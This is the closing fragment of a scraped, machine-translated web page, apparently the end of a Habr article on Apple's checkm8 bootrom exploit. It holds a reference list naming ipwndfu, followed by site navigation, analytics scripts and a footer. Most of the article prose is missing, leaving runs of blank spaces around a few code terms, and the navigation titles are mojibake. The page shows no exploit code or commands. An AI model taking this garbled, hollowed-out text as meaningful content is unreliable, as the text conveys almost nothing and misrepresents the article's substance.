<code>SecureROM</code>   <code>GID</code> -    .   ,   ,           <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="> JTAG/SWD </a> .        , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">    </a> ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="> </a> . ,   <code>checkm8</code> ,  <code>Apple</code>      . </p><br><h2 id="ssylki">  рд╕рдВрджрд░реНрдн </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="> ipwndfu  LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/hi471668/">https://habr.com/ru/post/hi471668/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../hi471658/index.html">рдлреЛрди рд╕реНрдХреИрдорд░реНрд╕ред рдкрд╣рд▓реА рдХреНрд░рд┐рдпрд╛ рдЬрд┐рд╕рдореЗрдВ рдореБрдЭреЗ рдЕрдиреНрдп рд╕реНрдХреИрдорд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ</a></li>
<li><a href="../hi471660/index.html">рдЦрд┐рд▓рд╛рдбрд╝реА рдордиреЛрд╡рд┐рдЬреНрдЮрд╛рди рд╡реНрдпрд╛рдЦреНрдпрд╛рди</a></li>
<li><a href="../hi471662/index.html">рд╡реЗрдм - рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рд╕реНрдерд╛рдкрди рдФрд░ рдореВрд▓ рдХреЛрдбред рд╕рдорд╕реНрдпрд╛ рдХреЛ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде r0ot-mi рд╡реЗрдм - рдХреНрд▓рд╛рдЗрдВрдЯред рднрд╛рдЧ 1</a></li>
<li><a href="../hi471664/index.html">ABBYY рдореЗрдВ рдЗрдВрдЯрд░реНрдирд╢рд┐рдк: рдПрдХ рдХрдВрдкрдиреА рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рдЖрдк "рдЖрдк" рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ</a></li>
<li><a href="../hi471666/index.html">рдХрд╛рд░реНрдп рд╡реАрдЬрд╛ рдкрд░ рдЬрд░реНрдордиреА рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрднрд╡ рдЖрдИрдУрдПрд╕ рдбреЗрд╡рд▓рдкрд░</a></li>
<li><a href="../hi471670/index.html">рд▓рдбрд╝рд╛рдИ рдореЗрдВ Jetpack рдХрдореНрдкреЛрдЬрд╝ рдХреА рдХреЛрд╢рд┐рд╢?</a></li>
<li><a href="../hi471676/index.html">рдлреЛрди рд╕реНрдХреИрдорд░реНрд╕ред рджреВрд╕рд░реА рдХрд╛рд░реНрд░рд╡рд╛рдИ, рдЬрд┐рд╕рдореЗрдВ рдореИрдВ рдЯреВрдЯ рдЧрдпрд╛ рдФрд░ рдирд┐рдХрдЯрддрдо рдПрдЯреАрдПрдо рдореЗрдВ рдЪрд▓рд╛ рдЧрдпрд╛</a></li>
<li><a href="../hi471678/index.html">рдорд╛рдВрдЧ рдкрд░ рднрд╛рд▓реВ рд╕реЗрд╡рд╛</a></li>
<li><a href="../hi471684/index.html">рдЖрдкрдХреЛ рдирдЧрдиреЗрдХреНрд╕ рдХреЗ рд▓рд┐рдП рдореЙрдбреНрдпреВрд▓ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреНрдпреЛрдВ рд╣реИ</a></li>
<li><a href="../hi471686/index.html">рдХреИрд╕реЗ AWS рдЕрдкрдиреА рд▓рдЪреАрд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛рдврд╝рд╛ рдХрд░рддрд╛ рд╣реИред рд╕рд░реНрд╡рд░ рдФрд░ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реНрдХреЗрд▓рд┐рдВрдЧ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>